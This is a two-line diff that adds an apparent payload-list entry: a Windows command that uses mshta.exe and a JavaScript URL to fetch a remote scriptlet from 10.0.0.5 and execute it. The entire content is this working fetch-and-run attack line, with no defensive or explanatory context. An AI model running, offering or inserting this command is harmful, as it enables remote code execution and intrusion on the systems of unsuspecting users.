@@ -1,0 +1,2 @@
+# from powershell
+/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
